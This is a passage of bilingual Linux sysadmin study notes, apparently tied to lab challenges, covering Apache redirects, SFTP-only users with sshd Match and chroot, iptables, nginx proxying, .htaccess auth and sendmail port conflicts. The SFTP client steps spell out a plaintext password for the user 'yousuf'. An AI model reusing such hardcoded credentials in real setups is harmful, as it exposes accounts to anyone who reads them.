  # ❌ INCORRECT (redirect loop)
  <VirtualHost *:80>
      ServerName example.com
      Redirect 301 / http://www.example.com/
  </VirtualHost>
  <VirtualHost *:80>
      ServerName www.example.com
      Redirect 301 / http://example.com/
  </VirtualHost>
  ```

**Canonicalization Google** :
- Choisir version canonique (www ou non-www)
- Google Search Console : Set preferred domain
- `<link rel="canonical">` HTML header (alternative redirect)

### mod_alias module

**Redirect directive** : Fournie par module `mod_alias`

**Vérifier module actif** :
```bash
# List loaded modules
httpd -M | grep alias
# Output : alias_module (shared)

# Config modules RHEL/CentOS
cat /etc/httpd/conf.modules.d/00-base.conf | grep alias
# LoadModule alias_module modules/mod_alias.so
```

**mod_alias directives** :
- `Redirect` : HTTP redirects (301, 302, etc.)
- `RedirectMatch` : Redirects regex
- `RedirectTemp` : Alias `Redirect temp` (302)
- `RedirectPermanent` : Alias `Redirect permanent` (301)
- `Alias` : Map URL path to filesystem path
  ```apache
  Alias /images /var/www/images
  # http://example.com/images/logo.png → /var/www/images/logo.png
  ```
- `ScriptAlias` : CGI scripts mapping
  ```apache
  ScriptAlias /cgi-bin/ /var/www/cgi-bin/
  ```

**Alternative redirection modules** :
- **mod_rewrite** : Powerful regex rewriting (complex rules)
  ```apache
  RewriteEngine On
  RewriteCond %{HTTP_HOST} ^example\.com$ [NC]
  RewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L]
  ```
- **mod_alias** : Simple redirects (recommended simple use cases)

**mod_alias vs mod_rewrite** :
- **mod_alias** : Simple, fast, limited (prefix matching)
- **mod_rewrite** : Complex, flexible, slower (regex, conditions)
- **Best practice** : Use mod_alias simple redirects, mod_rewrite complex

### Testing redirects

**curl tests** :
```bash
# Test redirect (follow redirects)
curl -L http://example.com/old-page
# -L : Follow redirects automatically

# Test redirect headers (no follow)
curl -I http://example.com/old-page
# Output :
# HTTP/1.1 301 Moved Permanently
# Location: http://example.com/new-page

# Verbose redirect chain
curl -Lv http://example.com/old-page
# Shows each redirect step

# Custom User-Agent
curl -A "Mozilla/5.0" http://example.com/
```

**Browser DevTools** :
- Network tab → Inspect redirect chain
- Status codes : 301, 302, etc.
- Headers : Location header shows destination

**Online tools** :
- [Redirect Checker](https://www.redirect-checker.org/)
- [HTTP Status Checker](https://httpstatus.io/)
- Shows redirect chain, status codes, headers

### Common pitfalls

**Redirect loop** :
```apache
# ❌ WRONG
Redirect 301 /page http://example.com/page
# Loop : /page → /page → /page → ...
```

**Missing trailing slash** :
```apache
# Redirect /blog → /news
Redirect 301 /blog http://example.com/news

# /blog → http://example.com/news ✅
# /blog/ → http://example.com/news/ ✅
# /blogpost → http://example.com/newspost ❌ (unexpected)
```

**Solution trailing slash** :
```apache
# Redirect exact /blog/ only (avec slash)
Redirect 301 /blog/ http://example.com/news/
```

**Port dans redirects** :
```apache
# Port custom 6100 → MUST specify destination URL
Redirect 301 / http://www.example.com:6100/
# PAS http://www.example.com/ (default port 80)
```

**HTTPS redirects** :
```apache
# HTTP → HTTPS redirect
<VirtualHost *:80>
    ServerName example.com
    Redirect 301 / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    SSLEngine on
    DocumentRoot /var/www/html
</VirtualHost>
```

### Best practices

**Choose redirect type** :
- Migration permanent → 301
- Restructuration temporaire → 302
- Canonicalization (non-www → www) → 301

**Minimize redirect chains** :
- Direct redirect (A → C, pas A → B → C)
- Performance impact (each redirect = HTTP round-trip)

**Test before deploy** :
- `httpd -t` syntax validation
- curl tests redirects
- Browser DevTools verify headers

**Monitor redirects** :
- Google Search Console : Crawl errors, redirect loops
- Server logs : 301/302 responses patterns
- Analytics : Traffic ancien URLs (verify redirects working)

**Document redirects** :
- Configuration comments (why redirect)
- Changelog (when redirect added, reason)
- SEO team communication (301 migrations)

---

## Module 41 : SFTP Configuration & Security

### Introduction SFTP

**SFTP (SSH File Transfer Protocol)** : Protocole transfert fichiers sécurisé via SSH (Secure Shell).

**SFTP vs FTP** :

| Critère | FTP | SFTP |
|---------|-----|------|
| **Encryption** | ❌ Plain text (credentials + data) | ✅ SSH encrypted (end-to-end) |
| **Port** | 21 (control) + 20 (data) active<br>21 (control) + random high passive | 22 (SSH unique port) |
| **Authentication** | Username/Password | SSH keys OR password |
| **Firewall** | ❌ Complex (multiple ports, active/passive modes) | ✅ Simple (single port 22) |
| **Commands** | FTP commands (LIST, RETR, STOR, etc.) | SFTP commands (ls, get, put, etc.) |
| **Protocol** | FTP/FTPS (separate protocols) | SSH subsystem (integrated) |
| **Security** | 🔴 Insecure (sniffing attacks) | 🟢 Secure (SSH infrastructure) |

**SFTP advantages** :
- **Encrypted** : Credentials + data encrypted (SSH)
- **Single port** : Firewall simple (port 22 only)
- **SSH infrastructure** : Reuse SSH keys, authentication, audit
- **Interactive** : File management (ls, cd, mkdir, rm, chmod)
- **Resume transfers** : reget, reput commands (interrupted transfers)

**SFTP vs SCP** :

| Critère | SFTP | SCP |
|---------|------|-----|
| **Interactive** | ✅ Yes (shell commands) | ❌ No (single transfer) |
| **Commands** | ls, cd, mkdir, rm, get, put | scp file user@host:path |
| **Resume** | ✅ reget/reput | ❌ No resume |
| **Script-friendly** | ⚠️ Possible (expect, lftp) | ✅ One-liner transfers |
| **Performance** | ⚠️ Overhead (interactive) | ✅ Fast (optimized single transfer) |

**Use cases SFTP** :
- **Developers** : Upload code, configurations, logs (interactive file management)
- **Automated backups** : Scripts SFTP (batch transfers)
- **External partners** : Secure file exchange (avoid email attachments)
- **Compliance** : Encrypted transfers (GDPR, HIPAA, PCI-DSS)

### SFTP architecture

**OpenSSH SFTP subsystem** :
```
Client (sftp, FileZilla, WinSCP)
    ↓ SSH connection (port 22, encrypted)
Server : sshd (SSH daemon)
    ↓ Subsystem sftp → internal-sftp OR sftp-server
    ↓
Filesystem (/home/user/, ChrootDirectory possible)
```

**Two SFTP subsystems** :

**1. sftp-server (legacy)** :
```bash
Subsystem sftp /usr/libexec/openssh/sftp-server
```
- External binary `/usr/libexec/openssh/sftp-server`
- Separate process (fork/exec overhead)
- Limited ChrootDirectory support (pas toujours fonctionnel)

**2. internal-sftp (modern)** :
```bash
Subsystem sftp internal-sftp
```
- Builtin SSH daemon (no external binary)
- Same process sshd (performance)
- **ChrootDirectory support** : Filesystem isolation (jail)
- **Recommended** modern deployments

**ChrootDirectory** :
```bash
Match Group ftp
        ChrootDirectory /data/sftp/%u
        ForceCommand internal-sftp
```
- `/data/sftp/%u` : `%u` = username (ex: `/data/sftp/alice`)
- User voit `/` = `/data/sftp/alice` (jail filesystem)
- Security : User cannot access `/etc`, `/var`, `/home` autres users
- **Requirements** :
  * Chroot directory ownership : `root:root`
  * Chroot directory permissions : `755` (writable par root only)
  * User home INSIDE chroot : `/data/sftp/alice/home/` (writable user)

### SSH configuration (sshd_config)

**Configuration file** : `/etc/ssh/sshd_config`

**Subsystem directive** :
```bash
# Legacy sftp-server (external binary)
#Subsystem sftp /usr/libexec/openssh/sftp-server

# Modern internal-sftp (builtin)
Subsystem sftp internal-sftp
```

**Global directives** (apply tous users) :
```bash
# Port SSH (default 22)
Port 22

# Authentication methods
PasswordAuthentication yes
PubkeyAuthentication yes
PermitRootLogin no

# Security
PermitEmptyPasswords no
X11Forwarding yes
AllowTcpForwarding yes
```

**Match directive** (conditional configuration) :
```bash
Match Group ftp
        X11Forwarding no
        AllowTcpForwarding no
        PermitTTY no
        GatewayPorts no
        ForceCommand internal-sftp
        PasswordAuthentication yes
```

**Match conditions** :
- `Match Group groupname` : Users membre groupe
- `Match User username` : User spécifique
- `Match Address 192.168.1.0/24` : Connexions depuis subnet
- `Match Host *.example.com` : Connexions depuis domain
- `Match LocalPort 2222` : Connexions sur port

**Multiple Match blocks** :
```bash
# SFTP-only users (group ftp)
Match Group ftp
        ForceCommand internal-sftp
        ChrootDirectory /data/sftp/%u
        PasswordAuthentication yes

# Developers (group developers)
Match Group developers
        AllowTcpForwarding yes
        PasswordAuthentication yes
        X11Forwarding yes

# Admins (user admin)
Match User admin
        AllowTcpForwarding yes
        PermitRootLogin yes
```

### ForceCommand internal-sftp

**Directive** :
```bash
ForceCommand internal-sftp
```

**Behavior** :
- **Force** execution `internal-sftp` command (ignore client commands)
- Client attempts shell login → Server executes `internal-sftp` → Displays "SFTP connections only"
- Client attempts arbitrary command → Blocked (SFTP-only)

**Security implications** :
- User **cannot** execute shell commands (bash, sh, zsh)
- User **cannot** access system binaries (ls, cat, vim, etc.)
- User **can only** SFTP file transfers (get, put, ls, cd, mkdir, rm)

**Example** :
```bash
# User attempts SSH shell login
ssh yousuf@server
# Output : This service allows sftp connections only.
# Connection to server closed.

# User attempts command execution
ssh yousuf@server ls
# Output : This service allows sftp connections only.

# User SFTP connection (OK)
sftp yousuf@server
# Connected to server.
# sftp> ls
# (SFTP commands work)
```

### SSH restrictions directives

**X11Forwarding** :
```bash
X11Forwarding no
```
- Bloque X11 GUI forwarding (applications graphiques remote)
- Security : X11 protocol vulnerabilities historiques (avoid exposure)
- Use case : GUI apps remote (`ssh -X user@server firefox`)

**AllowTcpForwarding** :
```bash
AllowTcpForwarding no
```
- Bloque SSH tunnels (local/remote port forwarding)
- Local forward example (blocked) : `ssh -L 8080:localhost:80 user@server`
- Remote forward example (blocked) : `ssh -R 8080:localhost:80 user@server`
- Security : Avoid firewall bypass via SSH tunnels

**PermitTTY** :
```bash
PermitTTY no
```
- Bloque allocation TTY (terminal interactif)
- Sans TTY : No shell interactif (bash, vim, top, etc.)
- ForceCommand internal-sftp : No TTY required (file transfers only)

**GatewayPorts** :
```bash
GatewayPorts no
```
- Bloque remote port forwarding listen external interfaces
- Default `no` : Remote forwards listen localhost only (127.0.0.1)
- `yes` : Remote forwards listen all interfaces (0.0.0.0) → Security risk
- Security : Avoid SSH server becoming network gateway

**PasswordAuthentication** :
```bash
PasswordAuthentication yes
```
- Enable password authentication (vs SSH keys only)
- Challenge 2 requirement : Developers password login
- Production best practice : SSH keys (passwordless, revocable, audit)

**Comparison password vs SSH keys** :

| Critère | Password | SSH Keys |
|---------|----------|----------|
| **Convenience** | ✅ Easy users (memorize password) | ⚠️ Key management (files, passphrases) |
| **Security** | ⚠️ Brute force attacks | ✅ Immune brute force (key length) |
| **Revocation** | ⚠️ Change password (notify users) | ✅ Remove public key (instant) |
| **Audit** | ⚠️ Password shared (no traceability) | ✅ Keys individual (audit who) |
| **Automation** | ❌ Scripts prompt password | ✅ Passwordless automation |

### User management SFTP

**useradd command** :
```bash
sudo useradd [options] username
```

**Options importantes** :
- `-G group1,group2` : Add user to supplementary groups
- `-s /path/shell` : Set login shell
- `-m` : Create home directory
- `-d /custom/home` : Custom home directory path
- `-u 1500` : Custom UID
- `-c "Full Name"` : User comment (GECOS field)

**Challenge 2 user creation** :
```bash
sudo useradd -G ftp -s /usr/sbin/nologin -m yousuf
```
- `-G ftp` : Add user to group `ftp` (Match Group trigger)
- `-s /usr/sbin/nologin` : Shell nologin (empêche login interactif)
- `-m` : Create home directory `/home/yousuf`

**Shell /usr/sbin/nologin** :
- **Purpose** : Non-interactive shell (empêche login console/SSH shell)
- **Behavior** :
  ```bash
  # SSH login attempt
  ssh yousuf@server
  # Output : This account is currently not available.
  # Connection to server closed.
  
  # SFTP login (ForceCommand internal-sftp OK)
  sftp yousuf@server
  # Connected to server. ✅
  ```
- **Use cases** :
  * Service accounts (apache, nginx, mysql)
  * SFTP-only users (Challenge 2)
  * Application users (non-human)

**Alternative /bin/false** :
- `/bin/false` : Exit immediately (no message)
- `/usr/sbin/nologin` : Display message `/etc/nologin.txt` (user-friendly)
- **Recommendation** : `/usr/sbin/nologin` (informative)

**passwd command** :
```bash
# Interactive password set
sudo passwd username
# Enter new password: 
# Retype new password:

# Non-interactive (scripts)
echo "password" | sudo passwd --stdin username
```

**usermod command** :
```bash
# Add user to group (append)
sudo usermod -aG ftp username

# Change shell
sudo usermod -s /bin/bash username

# Lock account (disable login)
sudo usermod -L username

# Unlock account
sudo usermod -U username

# Change home directory
sudo usermod -d /new/home username
```

**User verification** :
```bash
# User details
id username
# uid=1003(username) gid=1003(username) groups=1003(username),50(ftp)

# /etc/passwd entry
grep username /etc/passwd
# username:x:1003:1003::/home/username:/usr/sbin/nologin

# Group membership
groups username
# username : username ftp

# Home directory
ls -ld /home/username
# drwx------ 2 username username 62 Jan 17 20:00 /home/username
```

### Group ftp

**Group pre-existing** :
```bash
# Verify group exists
grep ftp /etc/group
# ftp:x:50:

# Group details
getent group ftp
# ftp:x:50:

# List users groupe ftp
lid -g ftp
# yousuf(uid=1003)
```

**Create group si inexistant** :
```bash
sudo groupadd ftp

# Custom GID
sudo groupadd -g 50 ftp
```

**Add users to group** :
```bash
# Single user
sudo usermod -aG ftp username

# Multiple users
sudo usermod -aG ftp user1
sudo usermod -aG ftp user2
```

**Match Group ftp configuration** :
```bash
Match Group ftp
        ForceCommand internal-sftp
        # Configuration applied tous users groupe ftp
```

### SFTP clients

**Command-line sftp** :
```bash
# Connect SFTP
sftp username@server
# Password: 

# SFTP commands
sftp> pwd                    # Print working directory
sftp> ls                     # List remote files
sftp> cd /path/              # Change remote directory
sftp> get file.txt           # Download file
sftp> put local.txt          # Upload file
sftp> mkdir newdir           # Create remote directory
sftp> rm file.txt            # Delete remote file
sftp> chmod 644 file.txt     # Change permissions
sftp> exit                   # Quit SFTP

# Non-interactive transfer
sftp username@server:/remote/file.txt /local/destination/

# Batch mode (script)
sftp -b commands.txt username@server
# commands.txt :
# cd /remote/path
# get file1.txt
# put file2.txt
# exit
```

**GUI clients** :
- **FileZilla** : Cross-platform, popular, SFTP/FTP/FTPS
- **WinSCP** : Windows, SCP/SFTP, scripting support
- **Cyberduck** : macOS/Windows, cloud storage integration
- **Transmit** : macOS, professional features

**FileZilla SFTP connection** :
1. Host : `sftp://server` (or just `server`)
2. Username : `yousuf`
3. Password : `ksH85UJjhb`
4. Port : `22`
5. Connect → Browse files drag&drop

**WinSCP SFTP connection** :
1. File protocol : SFTP
2. Host name : `server`
3. Port : `22`
4. Username : `yousuf`
5. Password : `ksH85UJjhb`
6. Login → File manager interface

### ChrootDirectory (advanced)

**Purpose** : Jail SFTP users to specific directory (filesystem isolation).

**Configuration** :
```bash
Match Group ftp
        ChrootDirectory /data/sftp/%u
        ForceCommand internal-sftp
        X11Forwarding no
        AllowTcpForwarding no
```

**Variables** :
- `%u` : Username (ex: `yousuf` → `/data/sftp/yousuf`)
- `%h` : User home directory
- `%%` : Literal `%`

**Requirements ChrootDirectory** :
1. **Ownership** : Chroot directory MUST be owned `root:root`
2. **Permissions** : Chroot directory MUST be `755` or stricter (NOT writable group/other)
3. **User home** : Writable directory INSIDE chroot (user upload files)

**Setup example** :
```bash
# Create chroot directory
sudo mkdir -p /data/sftp/yousuf
sudo chown root:root /data/sftp/yousuf
sudo chmod 755 /data/sftp/yousuf

# Create writable user home inside chroot
sudo mkdir -p /data/sftp/yousuf/uploads
sudo chown yousuf:yousuf /data/sftp/yousuf/uploads
sudo chmod 755 /data/sftp/yousuf/uploads

# sshd_config
Match Group ftp
        ChrootDirectory /data/sftp/%u
        ForceCommand internal-sftp
```

**User perspective** :
```bash
sftp yousuf@server
# Connected to server.

sftp> pwd
# Remote working directory: /
# (Actually /data/sftp/yousuf on server)

sftp> ls
# uploads

sftp> cd /etc
# Couldn't canonicalize: No such file or directory
# (Cannot access /etc - outside chroot)

sftp> cd /uploads
sftp> put file.txt
# Uploading file.txt to /uploads/file.txt
# (Actually /data/sftp/yousuf/uploads/file.txt server)
```

**Security benefits** :
- User cannot access `/etc`, `/var`, `/home` other users
- User cannot see system files (passwords, configurations)
- Compliance : Data isolation (multi-tenant environments)

**Common error** :
```
fatal: bad ownership or modes for chroot directory "/data/sftp/yousuf"
```
- **Cause** : Chroot directory writable by non-root
- **Fix** : `sudo chown root:root /data/sftp/yousuf && sudo chmod 755 /data/sftp/yousuf`

### SFTP logging

**SSH daemon logs** :
```bash
# journalctl (systemd)
sudo journalctl -u sshd -f
# Follow SFTP connections real-time

# /var/log/secure (RHEL/CentOS)
sudo tail -f /var/log/secure

# /var/log/auth.log (Debian/Ubuntu)
sudo tail -f /var/log/auth.log
```

**Log examples** :
```
# SFTP connection accepted
Accepted password for yousuf from 192.168.1.100 port 54321 ssh2

# SFTP session opened
subsystem request for sftp by user yousuf

# File transfer (no detail by default)
# (Requires LogLevel VERBOSE)

# SFTP session closed
Received disconnect from 192.168.1.100 port 54321:11: disconnected by user
```

**Verbose logging** :
```bash
# /etc/ssh/sshd_config
LogLevel VERBOSE

# Restart sshd
sudo systemctl restart sshd

# Logs show more details
# - Files transferred (get, put)
# - Directories accessed (cd, ls)
# - Permissions changes (chmod, chown)
```

**Audit SFTP transfers** :
- **rsyslog** : Centralize logs (syslog server)
- **SIEM** : Security Information Event Management (Splunk, ELK)
- **File integrity monitoring** : AIDE, Tripwire (detect unauthorized changes)

### SFTP security best practices

**SSH keys vs passwords** :
```bash
# Generate SSH key pair (client)
ssh-keygen -t ed25519 -C "user@example.com"

# Copy public key to server
ssh-copy-id yousuf@server

# Disable password authentication (sshd_config)
PasswordAuthentication no
PubkeyAuthentication yes

# User connects passwordless
sftp yousuf@server
# (Uses SSH key, no password prompt)
```

**Restrict users to SFTP-only** :
```bash
Match Group ftp
        ForceCommand internal-sftp
        X11Forwarding no
        AllowTcpForwarding no
        PermitTTY no
```

**Filesystem isolation** :
```bash
Match Group ftp
        ChrootDirectory /data/sftp/%u
        ForceCommand internal-sftp
```

**Firewall rules** :
```bash
# Allow SSH/SFTP port 22 only trusted IPs
sudo firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" port port="22" protocol="tcp" accept' --permanent
sudo firewall-cmd --reload
```

**Fail2ban** : Block brute-force attacks
```bash
# Install fail2ban
sudo yum install fail2ban -y

# Enable SSH jail (/etc/fail2ban/jail.local)
[sshd]
enabled = true
port = 22
logpath = /var/log/secure
maxretry = 3
bantime = 3600

# Start fail2ban
sudo systemctl enable --now fail2ban
```

**Strong passwords** :
```bash
# Enforce password policy (/etc/security/pwquality.conf)
minlen = 12
dcredit = -1    # At least 1 digit
ucredit = -1    # At least 1 uppercase
lcredit = -1    # At least 1 lowercase
ocredit = -1    # At least 1 special char
```

**Rate limiting** :
```bash
# sshd_config
MaxAuthTries 3
MaxSessions 2
LoginGraceTime 30
```

**Monitoring** :
- Logs review regular (unauthorized access attempts)
- User activity audit (files uploaded/downloaded)
- Disk space monitoring (prevent quota abuse)

### Troubleshooting SFTP

**Connection refused** :
```bash
# Check sshd status
sudo systemctl status sshd

# Check port listening
sudo ss -tulnp | grep :22

# Check firewall
sudo firewall-cmd --list-all
```

**Authentication failed** :
```bash
# Verify user exists
id username

# Verify password
sudo passwd username

# Check sshd_config
grep PasswordAuthentication /etc/ssh/sshd_config
# PasswordAuthentication yes

# Check Match Group
grep -A 10 "Match Group ftp" /etc/ssh/sshd_config
```

**Permission denied** :
```bash
# Check home directory ownership
ls -ld /home/username
# drwx------ username username

# Check home directory permissions
chmod 700 /home/username
sudo chown username:username /home/username

# Check ChrootDirectory (if configured)
ls -ld /data/sftp/username
# drwxr-xr-x root root  (755, root-owned)
```

**"This service allows sftp connections only"** :
- ✅ Expected behavior (ForceCommand internal-sftp working)
- User attempts SSH shell → Blocked (SFTP-only configuration correct)

**Subsystem request failed** :
```bash
# Check Subsystem directive
grep "Subsystem sftp" /etc/ssh/sshd_config
# Subsystem sftp internal-sftp

# Restart sshd
sudo systemctl restart sshd
```

**Chroot errors** :
```
fatal: bad ownership or modes for chroot directory
```
- **Fix** : `sudo chown root:root /chroot/path && sudo chmod 755 /chroot/path`

**Debug mode sshd** :
```bash
# Stop sshd
sudo systemctl stop sshd

# Run sshd debug mode
sudo /usr/sbin/sshd -d -p 2222

# Connect client (port 2222)
sftp -P 2222 username@server

# Check debug output server terminal
```

### SFTP vs alternatives

**FTPS (FTP over TLS)** :
- FTP with TLS/SSL encryption
- Ports : 21 (control), 990 (implicit TLS), 20/high (data)
- Firewall complex (passive mode ports range)
- Legacy systems compatibility

**rsync over SSH** :
- Efficient delta transfers (only changed parts)
- Archive mode (preserve permissions, timestamps)
- Exclude patterns (filter files)
- Example : `rsync -avz /local/ user@server:/remote/`

**SCP (Secure Copy)** :
- Simple one-liner transfers
- No interactive file management
- Example : `scp file.txt user@server:/path/`

**WebDAV** :
- HTTP-based file access
- Browser accessible (no special client)
- Firewall friendly (ports 80/443)
- Integration SharePoint, ownCloud, Nextcloud

**Cloud storage** :
- AWS S3, Azure Blob, Google Cloud Storage
- CLI tools (aws s3, gsutil, azcopy)
- API integration (automation)
- Scalability, redundancy, CDN

**Choice criteria** :

| Use Case | Recommended |
|----------|-------------|
| Developers file transfers | SFTP |
| Automated backups | rsync, SCP |
| Large file transfers | rsync (resume, delta) |
| Web integration | WebDAV |
| External partners (no tech) | SFTP + GUI client |
| Compliance (encryption) | SFTP, FTPS |
| Legacy FTP replacement | SFTP |

---

## Module 42 : Apache Tomcat & Java Deployment (Challenge 3)

**Concepts clés** :
- **Tomcat** : Servlet container Java (servlets, JSP)
- **WAR deployment** : Web Application Archive packaging
- **ROOT.war** : Base URL context path `/` (default application)
- **server.xml** : Connector port configuration (8080 → 6200)
- **Webapps directory** : `/var/lib/tomcat/webapps/` auto-deploy
- **Hot deployment** : Tomcat détecte nouveaux WARs (autoDeploy="true")
- **Logs** : `/var/log/tomcat/catalina.out` (startup, errors)

---

## Module 43 : Network Troubleshooting & Port Conflicts (Challenge 4)

**Concepts clés** :
- **Port conflict** : Sendmail (5001) vs Apache (5001) → Address already in use
- **Diagnostic tools** : netstat, ss, telnet, lsof, nmap
- **netstat -tulnp** : List ports + processes (identify owner)
- **telnet localhost PORT** : Test service response (identify protocol)
- **Sendmail config** : sendmail.mc → sendmail.cf (m4 compilation)
- **DAEMON_OPTIONS** : Port modification (5001 → smtp alias 25)
- **iptables troubleshooting** : Local OK, remote KO → Firewall block
- **iptables -I INPUT 1** : Insert rule position 1 (processed first)
- **service iptables save** : Persistent rules (/etc/sysconfig/iptables)

---

## Module 44 : iptables Advanced - Whitelist Multi-Server (Challenge 5)

**Concepts clés** :
- **Whitelist pattern** : ACCEPT specific sources + REJECT all others (default deny)
- **Source IP filtering** : `-s 172.16.238.14/32` (single host /32 notation)
- **ACCEPT vs REJECT vs DROP** : 
  * ACCEPT : Allow traffic
  * REJECT : Block + ICMP error (immediate feedback)
  * DROP : Block silently (stealth, no response)
- **Rule order** : Top-to-bottom, first match wins (specific rules FIRST)
- **iptables-services** : Package persistent rules (RHEL/CentOS)
- **service iptables save** : Write rules `/etc/sysconfig/iptables`
- **systemctl enable iptables** : Load rules boot automatically
- **Multi-server consistency** : Identical configuration 3 App Servers (manual OR automation)

---

## Module 45 : Nginx Reverse Proxy Advanced (Challenge 6)

**Concepts clés** :
- **Reverse proxy** : Nginx frontend → Apache backend (architecture production)
- **upstream directive** : Define backend servers group (load balancing)
- **keepalive** : Persistent connections pool (performance, avoid TCP handshake)
- **proxy_pass** : Forward requests to backend (`http://backend_app`)
- **Proxy headers** : 
  * `proxy_set_header Host $host` : Preserve original Host
  * `proxy_set_header X-Real-IP $remote_addr` : Client real IP
  * `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for` : Proxy chain
  * `proxy_set_header X-Forwarded-Proto $scheme` : HTTP/HTTPS protocol
- **Security headers** : X-Content-Type-Options, X-Frame-Options, Referrer-Policy
- **Timeouts** : proxy_connect_timeout, proxy_send_timeout, proxy_read_timeout
- **Buffers** : proxy_buffering, proxy_buffers (response buffering performance)
- **nginx -t** : Syntax validation CRITICAL before restart
- **Use cases** : SSL termination, load balancing, caching, WAF, security

---

## Module 46 : Apache HTTP Authentication & .htaccess (Challenge 7)

### Concepts clés
- **HTTP Basic Authentication** : Transmission username:password en base64 (utiliser avec HTTPS en production)
- **.htaccess** : Configuration Apache au niveau répertoire (rechargement dynamique sans restart)
- **htpasswd** : Utilitaire de gestion des fichiers de mots de passe Apache
- **Prérequis** : `AllowOverride` activé dans configuration principale Apache

### Configuration .htaccess
```apache
AuthUserFile /path/absolute/.htpasswd    # Chemin ABSOLU vers fichier de mots de passe
AuthType Basic                           # Type d'authentification HTTP
AuthName "Accès restreint"               # Realm affiché dans popup navigateur
require valid-user                       # Tout utilisateur authentifié autorisé
```

### Gestion utilisateurs htpasswd
```bash
# ATTENTION : -c écrase complètement le fichier existant
htpasswd -c /path/.htpasswd user1       # Créer nouveau fichier + user
htpasswd /path/.htpasswd user2          # Ajouter utilisateur à fichier existant
htpasswd -b /path/.htpasswd user pass   # Mode batch (mot de passe en CLI)
htpasswd -D /path/.htpasswd user        # Supprimer utilisateur
htpasswd -v /path/.htpasswd user        # Vérifier mot de passe
```

### Format fichier .htpasswd
```
username:$apr1$salt$hash
  │        │     │    └─ Hash MD5 du mot de passe
  │        │     └────── Salt (valeur aléatoire)
  │        └──────────── Identifiant algorithme (MD5 Apache)
  └───────────────────── Nom d'utilisateur
```

### Algorithmes de hash
| Format | Identifiant | Sécurité | Utilisation |
|--------|-------------|----------|-------------|
| MD5 Apache | `$apr1$` | Moyenne | Défaut Linux |
| bcrypt | `$2y$` | Haute | Recommandé (Apache 2.4+) |
| SHA-1 | `{SHA}` | Faible | Obsolète |

### Flux d'authentification
1. Client → GET /protected/ → Apache
2. Apache détecte .htaccess AuthType Basic → 401 Unauthorized + WWW-Authenticate
3. Client affiche popup → User saisit credentials
4. Client → GET /protected/ + Authorization: Basic base64(user:pass)
5. Apache décode → Hash password → Compare avec .htpasswd
6. Match → 200 OK + contenu / No match → 401

### Bonnes pratiques
- Toujours utiliser **chemin absolu** pour AuthUserFile
- Permissions .htpasswd : `chmod 640` + `chown root:apache`
- Option `.htaccess` : `Options -Indexes` (empêcher listing)
- Production : Combiner avec HTTPS (Basic Auth non chiffré)
- Alternative : Digest Authentication (hash MD5) ou Form-based

### Directives require
```apache
require valid-user                      # Tout utilisateur authentifié
require user alice bob                  # Utilisateurs spécifiques
require group admins                    # Groupe spécifique (AuthGroupFile requis)
require ip 192.168.1.0/24               # Restriction IP
```

---

## Module 47 : Linux Process Troubleshooting & Port Conflicts (Challenge 8)

### Concepts clés
- **Port binding conflict** : Deux services tentent d'écouter sur le même port (EADDRINUSE)
- **ss** (socket statistics) : Outil moderne de diagnostic réseau (remplace netstat)
- **Sendmail configuration** : Fichiers `.mc` (source) et `.cf` (compilé)
- **Service dependencies** : Ordre de démarrage systemd peut causer conflits

### ss - Diagnostic réseau moderne
```bash
ss -tulnp                  # TCP + UDP + Listen + Numeric + Process
# -t : Sockets TCP
# -u : Sockets UDP
# -l : Sockets en écoute (LISTEN)
# -n : Numérique (pas de résolution DNS/services)
# -p : Processus associés

# Exemples
ss -tulnp | grep :5003     # Identifier processus sur port spécifique
ss -tulnp | grep httpd     # Tous les ports d'un service
```

### Comparaison outils diagnostic
| Outil | Commande | Avantage | Inconvénient |
|-------|----------|----------|--------------|
| **ss** | `ss -tulnp` | Rapide, moderne | Syntaxe différente |
| netstat | `netstat -tulnp` | Syntaxe classique | Obsolète, lent |
| lsof | `lsof -i :port` | Tous types fichiers | Verbeux |
| fuser | `fuser port/tcp` | Léger | Peu d'infos |

### Sendmail configuration
```bash
# Fichiers de configuration
/etc/mail/sendmail.mc      # Source (macros m4) - À MODIFIER
/etc/mail/sendmail.cf      # Compilé (directives natives) - GÉNÉRÉ

# Directive de port dans .mc
DAEMON_OPTIONS(`Port=smtp,Addr=127.0.0.1, Name=MTA')dnl
# Port=smtp → Résolu via /etc/services (port 25)
# Port=5003 → Port numérique personnalisé (source problème)

# Compilation .mc → .cf
sudo make -C /etc/mail     # Utilise Makefile pour compilation m4
# Équivalent : m4 /etc/mail/sendmail.mc > /etc/mail/sendmail.cf

# Workflow complet
1. sudo vi /etc/mail/sendmail.mc      # Modifier Port=5003 → Port=smtp
2. sudo make -C /etc/mail             # Compiler .mc → .cf
3. sudo systemctl restart sendmail    # Appliquer nouvelle config
```

### Résolution conflit de port
**Méthodologie** :
1. **Diagnostic** : `ss -tulnp` → Identifier processus occupant le port
2. **Analyse** : Déterminer quel service doit utiliser le port
3. **Action** : Reconfigurer le service conflictuel sur autre port
4. **Compilation** : Si config templated (Sendmail .mc), recompiler
5. **Redémarrage** : Appliquer la nouvelle configuration
6. **Validation** : Vérifier avec `ss` et `curl`

### Scénario typique
```
Symptôme : Apache refuse de démarrer
Logs : "bind: Address already in use"

Investigation :
sudo ss -tulnp | grep :5003
→ tcp LISTEN 0.0.0.0:5003 sendmail

Résolution :
1. sudo systemctl stop sendmail
2. sudo vi /etc/mail/sendmail.mc → Port=5003 → Port=smtp
3. sudo make -C /etc/mail
4. sudo systemctl start sendmail  → Maintenant sur :25
5. sudo systemctl start httpd     → Peut bind :5003
```

### Bonnes pratiques
- **Documentation ports** : Maintenir registre allocation ports (éviter conflits)
- **Tests pre-deployment** : Vérifier `ss -tulnp` avant démarrage service
- **Systemd dependencies** : Utiliser `After=`, `Wants=` dans units
- **ExecStartPre** : Script validation port disponible avant démarrage
- **Monitoring** : Alertes sur services DOWN (détection rapide)

### Gestion dépendances systemd
```ini
# /etc/systemd/system/httpd.service.d/override.conf
[Unit]
After=network.target sendmail.service    # Démarrer après Sendmail
Wants=network.target                     # Dépendance souple

[Service]
ExecStartPre=/usr/local/bin/check-port.sh 5003  # Validation pre-start
```

---

## Module 21 : Apache PAM Authentication

### Concept PAM (Pluggable Authentication Modules)
**PAM** = Framework Linux modulaire pour authentification centralisée
- Utilisé par SSH, login, sudo, services web
- Permet réutilisation comptes Linux existants
- Alternative à fichiers htpasswd statiques

### Architecture PAM
```
Application (Apache) → libpam → Module PAM → Backend (/etc/shadow, LDAP, etc.)
